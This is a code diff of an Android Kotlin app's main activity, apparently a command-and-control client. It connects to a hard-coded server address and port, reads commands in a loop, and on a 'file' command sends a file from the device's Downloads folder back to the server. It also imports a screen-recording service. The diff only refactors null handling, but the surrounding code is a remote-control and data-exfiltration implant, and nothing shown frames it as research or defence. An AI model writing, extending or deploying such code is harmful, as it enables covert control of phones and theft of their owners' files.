@@ -4,18 +4,12 @@ import android.content.Intent
 import android.media.projection.MediaProjectionManager
 import android.os.Bundle
 import android.os.Environment
-import android.provider.ContactsContract.Directory
-import android.provider.MediaStore
-import android.provider.Settings
 import android.util.Log
 import android.view.View
 import android.widget.Button
-import androidx.activity.enableEdgeToEdge
 import androidx.activity.result.ActivityResultCallback
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
-import androidx.core.view.ViewCompat
-import androidx.core.view.WindowInsetsCompat
 import com.example.application.services.ScreenRecordingService
 import java.io.BufferedReader
 import java.io.File
@@ -32,10 +26,10 @@ class MainActivity : AppCompatActivity() {
 
     private val serverIp = "192.168.1.103"
     private val serverPort = 2020
-    private var outputStream: OutputStream? = null
-    private var inputStream: InputStream? = null
-    private var output: PrintWriter? = null
-    private var input: BufferedReader? = null
+    private lateinit var outputStream: OutputStream
+    private lateinit var inputStream: InputStream
+    private lateinit var output: PrintWriter
+    private lateinit var input: BufferedReader
 
     private val registerForActivity = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions(), ActivityResultCallback {
         val hasAllPermissionsGranted = it.all { it.value }
@@ -99,7 +93,7 @@ class MainActivity : AppCompatActivity() {
 
             while (true) {
                 // Read the command from the server
-                val command = input!!.readLine() ?: break
+                val command = input.readLine() ?: break
                 Log.d("C2Client", "Received command: $command")
 
                 // Execute the command and get the result
@@ -116,10 +110,10 @@ class MainActivity : AppCompatActivity() {
     private fun executeCommand(command: String) {
         when {
             command == "ping" -> {
-                output!!.println("pong")
+                output.println("pong")
             }
             command == "hello" -> {
-                output!!.println("Hello from the client")
+                output.println("Hello from the client")
             }
             command.contains("file") -> {
                 val file = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "hello.txt")
@@ -130,7 +124,7 @@ class MainActivity : AppCompatActivity() {
                 file.inputStream().use { fis ->
                     while (fis.read(bytes).also { bytesRead = it } != -1) {
                         Log.d(TAG, "executeCommand: ")
-                        outputStream!!.write(bytes)
+                        outputStream.write(bytes)
                     }
                 }
             }
